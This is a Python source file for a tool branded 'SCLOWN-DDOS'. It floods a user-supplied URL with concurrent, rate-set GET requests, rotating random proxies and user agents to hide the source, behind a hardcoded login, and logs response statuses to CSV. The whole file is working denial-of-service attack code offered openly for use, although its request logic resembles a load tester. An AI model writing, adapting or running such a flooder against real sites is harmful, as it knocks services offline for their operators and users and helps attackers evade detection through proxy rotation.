import asyncio
import aiohttp
import time
import random
import statistics
import csv
import os
import getpass

# ================= CORES =================
GREEN = "\033[32m"
RESET = "\033[0m"

# ================= CONFIG =================
USER_AGENT_FILE = "data/user-agent.txt"
PROXY_FILE = "data/proxies.txt"
TIMEOUT = 15

# ================= ASCII =================
def show_banner():
    os.system("cls" if os.name == "nt" else "clear")
    banner = f"""{GREEN}
   ███████╗ ██████╗ ██╗      ██████╗ ██╗    ██╗███╗   ██╗
   ██╔════╝██╔════╝ ██║     ██╔═══██╗██║    ██║████╗  ██║
   ███████╗██║      ██║     ██║   ██║██║ █╗ ██║██╔██╗ ██║
   ╚════██║██║      ██║     ██║   ██║██║███╗██║██║╚██╗██║
   ███████║╚██████╗ ███████╗╚██████╔╝╚███╔███╔╝██║ ╚████║
   ╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝

                  SCLOWN-DDOS
                  by salzin
{RESET}
"""
    print(banner)

# ================= LOGIN =================
def login():
    print(f"{GREEN}LOGIN{RESET}")
    user = input(f"{GREEN}User: {RESET}")
    password = getpass.getpass(f"{GREEN}Password: {RESET}")

    if user != "salzin" or password != "salzin":
        print(f"{GREEN}ACCESS DENIED{RESET}")
        exit()

    print(f"{GREEN}ACCESS GRANTED\n{RESET}")

# ================= LOAD =================
def load_list(path, fallback):
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = [line.strip() for line in f if line.strip()]
        return data if data else fallback
    except:
        return fallback

# ================= RATE LIMIT =================
class RateLimiter:
    def __init__(self, rate):
        self.rate = rate
        self.tokens = rate
        self.last = time.perf_counter()

    async def acquire(self):
        while True:
            now = time.perf_counter()
            elapsed = now - self.last
            self.tokens += elapsed * self.rate
            self.tokens = min(self.tokens, self.rate)
            self.last = now

            if self.tokens >= 1:
                self.tokens -= 1
                return
            await asyncio.sleep(0.001)

# ================= REQUEST =================
async def fetch(session, url, i, uas, proxies, limiter, results):
    await limiter.acquire()

    headers = {"User-Agent": random.choice(uas)}
    proxy = random.choice(proxies) if proxies else None

    start = time.perf_counter()
    try:
        async with session.get(url, headers=headers, proxy=proxy) as r:
            t = time.perf_counter() - start
            results.append((i, r.status, t))
            print(f"{GREEN}[{i}] {r.status} | {t:.3f}s{RESET}")
    except:
        t = time.perf_counter() - start
        results.append((i, None, t))
        print(f"{GREEN}[{i}] ERROR | {t:.3f}s{RESET}")

# ================= RUN =================
async def run(url, total, conc, rps):
    uas = load_list(USER_AGENT_FILE, ["Mozilla/5.0"])
    proxies = load_list(PROXY_FILE, [None])

    limiter = RateLimiter(rps)

    conn = aiohttp.TCPConnector(limit=conc)
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)

    results = []

    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        tasks = [
            fetch(session, url, i+1, uas, proxies, limiter, results)
            for i in range(total)
        ]
        await asyncio.gather(*tasks)

    return results

# ================= ANALYZE =================
def analyze(results, total_time):
    status = [r[1] for r in results]
    times = [r[2] for r in results]

    print(f"\n{GREEN}--------------------------------------{RESET}")
    print(f"{GREEN}RESULTADOS{RESET}")
    print(f"{GREEN}--------------------------------------{RESET}")

    print(f"{GREEN}Total: {len(results)}{RESET}")
    print(f"{GREEN}200: {status.count(200)}{RESET}")
    print(f"{GREEN}Errors: {status.count(None)}{RESET}")

    if times:
        print(f"{GREEN}Avg: {statistics.mean(times):.3f}s{RESET}")
        print(f"{GREEN}Max: {max(times):.3f}s{RESET}")

    print(f"{GREEN}Time: {total_time:.2f}s{RESET}")
    print(f"{GREEN}RPS: {len(results)/total_time:.2f}{RESET}")

# ================= CSV =================
def save_csv(results):
    os.makedirs("output", exist_ok=True)
    with open("output/results.csv", "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["id", "status", "time"])
        writer.writerows(results)

    print(f"{GREEN}Saved: output/results.csv{RESET}")

# ================= CLI =================
def main():
    show_banner()
    login()

    print(f"{GREEN}--------------------------------------{RESET}")
    print(f"{GREEN}CONFIG{RESET}")
    print(f"{GREEN}--------------------------------------{RESET}")

    url = input(f"{GREEN}URL      : {RESET}")
    total = int(input(f"{GREEN}REQUESTS : {RESET}"))
    conc = int(input(f"{GREEN}WORKERS  : {RESET}"))
    rps = int(input(f"{GREEN}RPS      : {RESET}"))

    print(f"\n{GREEN}--------------------------------------{RESET}")
    print(f"{GREEN}RUNNING{RESET}")
    print(f"{GREEN}--------------------------------------{RESET}\n")

    start = time.time()
    results = asyncio.run(run(url, total, conc, rps))
    end = time.time()

    analyze(results, end - start)
    save_csv(results)

# ================= ENTRY =================
if __name__ == "__main__":
    main()
